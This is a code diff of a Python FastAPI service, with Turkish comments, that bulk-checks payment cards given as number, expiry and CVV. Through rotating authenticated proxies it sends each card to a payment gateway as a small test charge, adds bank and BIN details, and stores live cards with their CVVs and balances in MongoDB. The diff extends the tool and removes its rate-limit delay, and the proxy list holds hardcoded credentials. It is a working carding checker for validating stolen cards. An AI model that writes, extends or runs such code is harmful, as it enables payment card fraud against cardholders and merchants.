@@ -1,121 +1,126 @@
 from fastapi import FastAPI, UploadFile, File
 from pydantic import BaseModel
-import requests, re, time, random, itertools, os
-from typing import List
+import requests, re, time, random, itertools
+from typing import List, Dict
 from datetime import datetime
 from pymongo import MongoClient
 
-app = FastAPI(title="Bulk Balance Checker + MongoDB")
+app = FastAPI(title="Full Checker API - BIN + Live + Balance")
 
-# ================== MONGO DB BAĞLANTISI ==================
+# ================== MONGO DB ==================
 MONGODB_URI = "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger"
-
 try:
     client = MongoClient(MONGODB_URI, tls=True, tlsAllowInvalidCertificates=True)
-    db = client["paymentmanger"]                    # Database adı
-    collection = db["checkbalance"]                 # Collection (tablo) adı
+    db = client["paymentmanger"]
+    collection = db["checkbalance"]
     print("[+] MongoDB bağlantısı başarılı")
 except Exception as e:
-    print(f"[!] MongoDB bağlantı hatası: {e}")
+    print(f"[!] MongoDB hatası: {e}")
     collection = None
 
 # ================== PROXY ROTASYONU ==================
-proxies = [
+proxies_list = [
     "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
     "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
     "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
     "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
     "http://akifdemi55574:llfg52end4@191.96.30.51:21276"
 ]
+proxy_cycle = itertools.cycle(proxies_list)
 
-proxy_cycle = itertools.cycle(proxies)
-
-def extract_balance(text: str):
-    patterns = [r'remaining balance.*?\$?(\d+\.?\d*)', r'balance[:\s$]*?(\d+\.?\d*)',
-                r'available.*?\$?(\d+\.?\d*)', r'\$?(\d{1,4}\.\d{2})']
-    for pattern in patterns:
-        match = re.search(pattern, text.lower())
-        if match:
-            return match.group(1)
-    return "0.00"
-
-def save_to_mongodb(card: str, balance: str, status: int):
-    if collection is None:
-        return
-    
-    cc = card.split("|")
-    if len(cc) < 4:
-        return
-    
+def get_bin_info(bin_number: str) -> Dict:
     try:
-        data = {
-            "cardnumber": cc[0],
-            "expMonth": int(cc[1]),
-            "expYear": int(cc[2]),
-            "cvv": cc[3],
-            "balance": balance,
-            "status": status,                     # 1 = live, 0 = dead
-            "timestamp": datetime.utcnow()
-        }
-        collection.insert_one(data)
-    except Exception as e:
-        print(f"[!] MongoDB yazma hatası: {e}")
+        r = requests.get(f"https://lookup.binlist.net/{bin_number[:6]}", timeout=8)
+        if r.status_code == 200:
+            data = r.json()
+            return {
+                "bin": bin_number[:6],
+                "brand": data.get("scheme", "").upper(),
+                "type": data.get("type", "").upper(),
+                "level": data.get("brand", "").upper(),
+                "bank": data.get("bank", {}).get("name", "Unknown"),
+                "country": data.get("country", {}).get("alpha2", "XX"),
+                "country_name": data.get("country", {}).get("name", "Unknown")
+            }
+    except:
+        pass
+    return {"bin": bin_number[:6], "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN", "bank": "Unknown", "country": "XX", "country_name": "Unknown"}
 
-def check_single(card: str):
+def save_to_mongodb(data: Dict):
+    if not collection: return
+    try:
+        collection.insert_one({**data, "timestamp": datetime.utcnow()})
+    except: pass
+
+# ================== ANA KONTROL FONKSİYONU ==================
+def full_check_card(card: str):
     proxy = next(proxy_cycle)
-    cc = card.split("|")
+    cc = card.strip().split("|")
     if len(cc) < 4:
-        return {"card": card, "status": "error", "msg": "Format hatalı"}
+        return {"error": "Format hatalı"}
 
-    number, month, year, cvv = [x.strip() for x in cc[:4]]
+    number, month, year, cvv = cc[0], cc[1], cc[2], cc[3]
+    bin_info = get_bin_info(number)
 
+    # Live + Balance Check
     headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
     payload = {"card_number": number, "card_exp_month": month, "card_exp_year": year, "card_cvv": cvv, "amount": "0.50"}
+
+    is_live = False
+    balance = "0.00"
 
     for _ in range(2):
         try:
             r = requests.post("https://secure.payadultgateway.com/transaction", 
                               headers=headers, data=payload, proxies={"https": proxy}, timeout=15)
-            balance_str = extract_balance(r.text)
-            
-            if balance_str and balance_str != "0.00":
-                save_to_mongodb(card, balance_str, 1)
-                with open("live_with_balance.txt", "a", encoding="utf-8") as f:
-                    f.write(f"{card} | Balance: ${balance_str}\n")
-                return {"card": card, "status": "live", "balance": f"${balance_str}"}
+            bal = re.search(r'(\d+\.?\d*)', r.text)
+            if bal:
+                balance = bal.group(1)
+                is_live = True
+                break
         except:
             time.sleep(2)
-            continue
 
-    save_to_mongodb(card, "0.00", 0)
-    with open("dead.txt", "a", encoding="utf-8") as f:
-        f.write(f"{card}\n")
-    return {"card": card, "status": "dead"}
+    status = 1 if is_live else 0
 
-# ================== BULK ENDPOINT ==================
-@app.post("/bulkcheck")
-async def bulk_check(cards: List[str]):
+    result = {
+        "card": card,
+        "bin": bin_info["bin"],
+        "brand": bin_info["brand"],
+        "type": bin_info["type"],
+        "level": bin_info["level"],
+        "bank": bin_info["bank"],
+        "country": bin_info["country"],
+        "country_name": bin_info["country_name"],
+        "live": is_live,
+        "balance": balance,
+        "status": status
+    }
+
+    save_to_mongodb(result)
+    return result
+
+# ================== ENDPOINTLER ==================
+@app.post("/fullcheck")
+async def fullcheck(cards: List[str]):
+    results = [full_check_card(card) for card in cards if card.strip()]
+    return {"total": len(results), "results": results}
+
+@app.post("/bincheck")
+async def bincheck(cards: List[str]):
     results = []
     for card in cards:
         if card.strip():
-            result = check_single(card.strip())
-            results.append(result)
-            time.sleep(random.uniform(1.8, 3.2))
-    
-    live_count = len([x for x in results if x.get("status") == "live"])
-    return {
-        "total": len(results), 
-        "live": live_count, 
-        "message": "İşlem tamamlandı ve MongoDB'ye kaydedildi.",
-        "results": results
-    }
+            bin_info = get_bin_info(card.split("|")[0])
+            results.append(bin_info)
+    return {"results": results}
 
 @app.post("/bulkcheck/file")
-async def bulk_from_file(file: UploadFile = File(...)):
+async def from_file(file: UploadFile = File(...)):
     content = await file.read()
     cards = content.decode("utf-8").splitlines()
-    return await bulk_check(cards)
+    return await fullcheck(cards)
 
 @app.get("/")
 async def home():
-    return {"status": "API is running - MongoDB Integrated"}
+    return {"status": "API aktif", "endpoints": ["/fullcheck", "/bincheck", "/docs"]}
